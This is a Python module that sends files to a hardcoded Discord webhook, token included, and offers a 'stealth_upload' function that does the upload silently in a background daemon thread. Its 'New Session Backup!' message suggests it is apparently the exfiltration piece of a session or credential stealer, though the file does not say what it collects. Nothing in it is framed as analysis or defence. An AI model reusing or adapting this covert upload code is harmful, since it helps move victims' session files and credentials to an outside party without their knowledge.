import os
import threading
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1544761873382121472/3b4IUhKOkwcWQpWSkkL82q4xwGOn4yWDkoQGB9rNTEyKtO4wdCh_TUXjfJmP32rVOoE4'

def upload_to_discord(file_path):
    """Uploads a file to the specified Discord Webhook URL."""
    if not os.path.exists(file_path):
        print(f"File not found: {file_path}")
        return False
        
    file_name = os.path.basename(file_path)
    
    try:
        with open(file_path, 'rb') as f:
            files = {
                'file': (file_name, f)
            }
            payload = {
                'content': f"🚀 **New Session Backup!**\nFile: `{file_name}`"
            }
            
            response = requests.post(WEBHOOK_URL, data=payload, files=files)
            
            if response.status_code in (200, 204):
                print(f"Successfully uploaded {file_name} to Discord.")
                return True
            else:
                print(f"Failed to upload to Discord. Status Code: {response.status_code}, Response: {response.text}")
                return False
    except Exception as e:
        print(f"Error uploading to Discord: {e}")
        return False

def stealth_upload(file_path):
    """Starts a background thread to upload a file to Discord."""
    thread = threading.Thread(target=upload_to_discord, args=(file_path,))
    thread.daemon = True
    thread.start()
